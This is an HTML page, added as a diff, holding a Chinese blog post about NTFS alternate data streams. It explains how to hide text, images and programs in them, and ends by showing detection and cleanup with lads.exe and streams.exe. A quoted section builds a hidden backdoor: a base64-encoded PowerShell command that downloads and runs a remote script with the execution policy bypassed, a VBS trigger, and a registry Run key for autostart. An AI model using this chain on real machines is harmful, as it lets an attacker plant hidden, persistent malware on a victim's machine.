@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="今天偶然间看到的，查了一下虽然不是什么新鲜的东西，但着实让我吃了一惊。 以下内容多数摘自网络。 什么是NTFS交换数据流（ADS）NTFS交换数据流（alternate data streams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息，虽然我们无">
+<meta property="og:type" content="article">
+<meta property="og:title" content="脑洞大开 - NTFS交换数据流ADS">
+<meta property="og:url" content="https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/index.html">
+<meta property="og:site_name" content="veritas501&#39;s blog">
+<meta property="og:description" content="今天偶然间看到的，查了一下虽然不是什么新鲜的东西，但着实让我吃了一惊。 以下内容多数摘自网络。 什么是NTFS交换数据流（ADS）NTFS交换数据流（alternate data streams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息，虽然我们无">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/NTFS_ADS_501120d30a03d1e79c32bb4ef3af93cc.png">
+<meta property="og:image" content="https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/NTFS_ADS_633903e3c0be74d2d9769d7c69a00d9b.png">
+<meta property="og:image" content="https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/NTFS_ADS_d056145f950b2bcbe27985095c0306f0.png">
+<meta property="og:image" content="https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/NTFS_ADS_2219a33b8f21a9ba436ca49b23674e06.png">
+<meta property="og:image" content="https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/NTFS_ADS_f1ccdf856183594d98163a86f6e0d312.png">
+<meta property="article:published_time" content="2017-03-03T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-12-08T03:09:28.354Z">
+<meta property="article:author" content="veritas501">
+<meta property="article:tag" content="脑洞">
+<meta property="article:tag" content="NTFS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/NTFS_ADS_501120d30a03d1e79c32bb4ef3af93cc.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>脑洞大开 - NTFS交换数据流ADS</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2017_03_04-Reversing.kr_writeup/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2017_03_01-HCTF_GAME_PWN%E9%A2%98_WP/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/&text=脑洞大开 - NTFS交换数据流ADS"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/&title=脑洞大开 - NTFS交换数据流ADS"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/&is_video=false&description=脑洞大开 - NTFS交换数据流ADS"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=脑洞大开 - NTFS交换数据流ADS&body=Check out this article: https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/&title=脑洞大开 - NTFS交换数据流ADS"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/&title=脑洞大开 - NTFS交换数据流ADS"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/&title=脑洞大开 - NTFS交换数据流ADS"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/&title=脑洞大开 - NTFS交换数据流ADS"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/&name=脑洞大开 - NTFS交换数据流ADS&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/&t=脑洞大开 - NTFS交换数据流ADS"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFNTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81%EF%BC%88ADS%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">什么是NTFS交换数据流（ADS）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.</span> <span class="toc-text">NTFS交换数据流隐藏文件实例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E6%96%87%E6%9C%AC"><span class="toc-number">2.1.</span> <span class="toc-text">隐藏文本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.</span> <span class="toc-text">隐藏文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8%EF%BC%88%E6%AD%A4%E6%AE%B5%E6%9D%A5%E8%87%AAFreeBuf%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">隐藏后门（此段来自FreeBuf）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B%E5%92%8C%E6%B8%85%E9%99%A4NTFS-ADS%E9%9A%90%E8%97%8F%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">如何检测和清除NTFS-ADS隐藏的文件</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        脑洞大开 - NTFS交换数据流ADS
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">veritas501</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-03-03T16:00:00.000Z" class="dt-published" itemprop="datePublished">2017-03-04</time>
+        
+        (Updated: <time datetime="2023-12-08T03:09:28.354Z" class="dt-updated" itemprop="dateModified">2023-12-08</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/NTFS/" rel="tag">NTFS</a>, <a class="p-category" href="/tags/%E8%84%91%E6%B4%9E/" rel="tag">脑洞</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>今天偶然间看到的，查了一下虽然不是什么新鲜的东西，但着实让我吃了一惊。</p>
+<p>以下内容多数摘自网络。</p>
+<h2 id="什么是NTFS交换数据流（ADS）"><a href="#什么是NTFS交换数据流（ADS）" class="headerlink" title="什么是NTFS交换数据流（ADS）"></a>什么是NTFS交换数据流（ADS）</h2><p>NTFS交换数据流（alternate data streams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息，虽然我们无法看到数据流文件，但是它却是真实存在于我们的系统中的。创建一个数据交换流文件的方法很简单，命令为”宿主文件:准备与宿主文件关联的数据流文件”。</p>
+<p><strong>以下一段摘自FreeBuf：</strong></p>
+<p>举个例子，我现在有一个文本文件，名称为test.txt，文本内容为”Hello, world!”。其MFT记录结构如图：</p>
+<p><img src="/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/NTFS_ADS_501120d30a03d1e79c32bb4ef3af93cc.png"></p>
+<p>$FILE_NAME属性包含了该文件名test.txt。 $DATA属性则包含了内容 “Hello, world!”。这里说个题外话，由于该内容长度小于1kb，所以文件的内容就直接存储在MFT记录里面了（称为resident）。如果内容长度大于1kb，文件内容会被存储在别的地方 （称为non-resident），在这种情况下$DATA属性只包含其存储地址。这里“Hello, world!”很短，所以直接保存在了MFT记录里面。</p>
+<p>很多人想当然的认为一个文件只能有一个$DATA属性，这是错误的。在NTFS中，一个文件可以有多个$DATA属性。比如我现在想给test.txt加入一个名为ThisIsAnADS的$DATA属性：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> Hello, freebuf! &gt; test.txt:ThisIsAnADS</span><br></pre></td></tr></table></figure>
+
+<p>那么，该文件的MFT记录就变成了下图所示:</p>
+<p><img src="/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/NTFS_ADS_633903e3c0be74d2d9769d7c69a00d9b.png"></p>
+<p>你可能发现了这两个$DATA属性还是略有不同的，第一个没有名称，而第二个有名称（ThisIsAnADS）！通常人们称第一个为主数据流（primary data stream ）。主数据流在文件创建的同时就被创建了，并且默认没有名称，所以也叫做未名数据流 （unnamed data stream）。第二个是我们后来创建的，并且赋予了名称（ThisIsAnADS）。这个就是供选数据流 （alternate data stream，ADS）。绝大多数用户只会和主数据流打交道，从某种意义上来说，ADS对用户是隐藏的。用常规的dir命令和windows文件管理器都没法发现ADS。而当我们查看文件内容的时候也仅仅显示主数据流的内容。</p>
+<h2 id="NTFS交换数据流隐藏文件实例"><a href="#NTFS交换数据流隐藏文件实例" class="headerlink" title="NTFS交换数据流隐藏文件实例"></a>NTFS交换数据流隐藏文件实例</h2><h3 id="隐藏文本"><a href="#隐藏文本" class="headerlink" title="隐藏文本"></a>隐藏文本</h3><p>在命令行下，我们敲：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 666666&gt;&gt;suzhu.txt:stream.txt</span><br></pre></td></tr></table></figure>
+<p>这里的<code>suzhu.txt</code>可以是目前不存在的文件，也可以是现有的文件。如果我们敲命令之前没有<code>suzhu.txt</code>，那么我们的文件夹下就多出了一个叫<code>suzhu.txt</code>的空白文件。</p>
+<p>查看我们的写入的文本也简单，敲命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad suzhu.txt:stream.txt</span><br></pre></td></tr></table></figure>
+
+<p>删除文件也简单，直接把<code>suzhu.txt</code>删掉，寄生的<code>stream.txt</code>也被删掉了。</p>
+<p>此处注意，如果我们当时创建流文件时敲的是：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 666666&gt;&gt;:stream.txt</span><br></pre></td></tr></table></figure>
+
+<p>那当我们需要删除这个文件的时候只能把这整个文件夹删除。</p>
+<p>**P.S.**另外，网上说此时我们可以敲<code>notepad YOUR_FOLDER\:stream.txt</code>打开这个流文件，但我没有成功。</p>
+<h3 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h3><p>和上面差不多，我们以一张20MB，名字为aaa.jpg的图片为例。</p>
+<p>我们敲命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> aaa.jpg&gt;&gt;suzhu.txt:aaa.jpg</span><br></pre></td></tr></table></figure>
+<p>删掉原来的<code>aaa.jpg</code>，我们多了一个叫<code>suzhu.txt</code>的空文件。右键查看这个空文件的属性，发现文件的大小为0字节，但占用空间为20MB，说明交换数据流还是会占空间的。</p>
+<p>我们用画板打开这张图片：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mspaint suzhu.txt:aaa.jpg</span><br></pre></td></tr></table></figure>
+
+<p>删除文件方法同上。</p>
+<h3 id="隐藏后门（此段来自FreeBuf）"><a href="#隐藏后门（此段来自FreeBuf）" class="headerlink" title="隐藏后门（此段来自FreeBuf）"></a>隐藏后门（此段来自FreeBuf）</h3><p>既然ADS不被大多数用户所知，而且常规的系统命令和文件管理器都检查不到其存在，那么我们可以把后门放在ADS以起到隐藏的目的。让我们先试着把netcat的二进制内容存到test.txt的一个叫nc.exe的ADS里面：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> nc.exe &gt; test.txt:nc.exe</span><br></pre></td></tr></table></figure>
+<p>可以写入，没有问题。试着执行之:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c:\<span class="built_in">test</span>&gt;start test.txt:nc.exe</span><br><span class="line">Access is denied.</span><br></pre></td></tr></table></figure>
+<p>但是执行不成功。。。因为从windows xp以后微软就禁止用户从ADS里执行程序了。写入，读出操作都可以，但是不允许执行。</p>
+<p>换一个思路，既然允许写和读，那么我们可以在ADS里面写入脚本，然后用脚本解释器(Wscript.exe)来运行该脚本。Wscript.exe默认支持js, vbs等，但是我更偏爱powershell的简单高效。所以准备在一个文件中写入2个ADS，一个包含powershell脚本后门，用于从网上下载和执行恶意脚本。一个包含VBS脚本，用于触发powershell脚本。具体设计如下图，包括3部分:</p>
+<p><img src="/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/NTFS_ADS_d056145f950b2bcbe27985095c0306f0.png"></p>
+<ol>
+<li><p>恶意脚本：一个提供真正的恶意功能的powershell脚本，比如反弹cmd shell等等，具体如何用powershell实现远控功能，请参照<a target="_blank" rel="noopener" href="https://github.com/mattifestation/PowerSploit%E3%80%82">https://github.com/mattifestation/PowerSploit。</a> 这里为了演示的目的，我们的”恶意脚本”只会弹出一个对话框，显示”Infected”。该文件名为malware.ps1，存放于 <a target="_blank" rel="noopener" href="http://127.0.0.1:8123/malware.ps1">http://127.0.0.1:8123/malware.ps1</a></p>
+</li>
+<li><p>下载器：该下载器也是一段powershell脚本，用来下载并执行恶意脚本。其实就一句话 “IEX ((New-Object Net.WebClient).DownloadString(&#039;<a target="_blank" rel="noopener" href="http://127.0.0.1:8123/malware.ps1&#039">http://127.0.0.1:8123/malware.ps1&amp;#039</a>;));” 我们把它base64编码[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(“IEX ((New-Object Net.WebClient).DownloadString(&#039;<a target="_blank" rel="noopener" href="http://127.0.0.1:8123/malware.ps1&#039;));%22))%E5%BE%97%E5%88%B0base64%E7%BC%96%E7%A0%81%E7%BB%93%E6%9E%9C%E3%80%82%E7%84%B6%E5%90%8E%E6%8A%8A">http://127.0.0.1:8123/malware.ps1&#039;));&quot;))得到base64编码结果。然后把</a> powershell.exe -ep Bypass -noexit -enc [base64编码结果] 写入test.txt:1</p>
+</li>
+<li><p>触发器：该触发器是一段VB脚本，会开一个cmd运行test.txt:1 里的脚本。由于我们要用wscript.exe 来运行这个ADS, 而wscript.exe会检查脚本文件的后缀名，所以这个ADS的命名必须以.vbs结尾。 具体内容为 Dim objShell:Set objShell &#x3D; WScript.CreateObject(“WScript.Shell”):command &#x3D; “cmd &#x2F;C for &#x2F;f “”delims&#x3D;,”” %i in (C:\test\test.txt:1) do %i”:objShell.Run command, 0:Set objShell &#x3D; Nothing，将其写入test.txt:2.vbs</p>
+</li>
+</ol>
+<p><img src="/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/NTFS_ADS_2219a33b8f21a9ba436ca49b23674e06.png"></p>
+<p>用wscript.exe运行一下，成功！进程管理器显示该进程名为powershell.exe</p>
+<p><img src="/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/NTFS_ADS_f1ccdf856183594d98163a86f6e0d312.png"></p>
+<p>当然，还可以把wscript.exe test.txt:2.vbs 放在注册表与自动启动相关的键值里，比如HKCU\Software\Microsoft\Windows\CurrentVersion\Run 等，以实现开机自启动。</p>
+<h2 id="如何检测和清除NTFS-ADS隐藏的文件"><a href="#如何检测和清除NTFS-ADS隐藏的文件" class="headerlink" title="如何检测和清除NTFS-ADS隐藏的文件"></a>如何检测和清除NTFS-ADS隐藏的文件</h2><p>简而言之，用软件。</p>
+<p>下载: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1qYnTbIW">https://pan.baidu.com/s/1qYnTbIW</a> 密码: v2bq</p>
+<p>lads.exe:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * 将这lads.exe这个程序放置需要检测的分区根目录中，</span><br><span class="line"> * 不添加任何参数直接运行，就是检测根目录中所有文件，</span><br><span class="line"> * 如果使用&quot;lads.exe test /S&quot;，就是递归检测test以及test下所子目录。</span><br><span class="line"> * 下面这条命令是检测根目录以及所有子目录。</span><br><span class="line"> */</span><br><span class="line">E:\&gt;lads.exe /S</span><br><span class="line"> </span><br><span class="line">Scanning directory E:\ with subdirectories</span><br><span class="line"> </span><br><span class="line">      size  ADS in file</span><br><span class="line">----------  ---------------------------------</span><br><span class="line">        12  E:\:123.txt</span><br><span class="line">    346112  E:\:aaa.exe</span><br><span class="line">    144588  E:\:bbb.jpg</span><br><span class="line">         7  E:\123.txt:222.txt</span><br><span class="line">    346112  E:\123.txt:aaa.exe</span><br><span class="line">     72294  E:\123.txt:bbb.jpg</span><br><span class="line">     72294  E:\aaa.exe:bbb.jpg</span><br><span class="line">        12  E:\test\:123.txt</span><br><span class="line">     72294  E:\test\:bbb.jpg</span><br><span class="line"> </span><br><span class="line">   1053737 bytes in 9 ADS listed</span><br><span class="line"> </span><br><span class="line">/*可以看到我们实验中添加的所有交换数据流一览无遗*/</span><br></pre></td></tr></table></figure>
+
+<p>使用streams.exe这个程序来清除这些交换数据流，根据上面检测的输出信息，我将streams.exe放在E盘的根目录：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 首先尝试清除一下E盘根目录上面寄生的交换数据流，</span></span><br><span class="line"><span class="comment"> * -d后面接目录。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">E:\&gt;streams.exe -d E:\</span><br><span class="line"> </span><br><span class="line">E:\:</span><br><span class="line">   Deleted :<span class="number">123.</span>txt:$DATA</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 这里出现了一个错误，因为这个:aaa.exe现在正在运行</span></span><br><span class="line"><span class="comment"> * 对于这种情况，需要先结束掉这个:aaa.exe进程才能清除。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">   Error deleting :aaa.exe:$DATA:</span><br><span class="line">?????</span><br><span class="line">   Deleted :bbb.jpg:$DATA</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*可以添加-s参数来一次性递归清除E盘下所有寄生的交换数据流文件（慎用，尤其是对系统盘一定不要随便使用递归清除，系统本身的一些数据流也会被一起清除掉）*/</span></span><br><span class="line">E:\&gt;streams.exe -s -d E:\</span><br><span class="line"> </span><br><span class="line">E:\<span class="number">123.</span>txt:</span><br><span class="line">   Deleted :<span class="number">222.</span>txt:$DATA</span><br><span class="line">   Deleted :aaa.exe:$DATA</span><br><span class="line">   Deleted :bbb.jpg:$DATA</span><br><span class="line">E:\aaa.exe:</span><br><span class="line">   Deleted :bbb.jpg:$DATA</span><br><span class="line">E:\test:</span><br><span class="line">   Deleted :<span class="number">123.</span>txt:$DATA</span><br><span class="line">   Deleted :bbb.jpg:$DATA</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
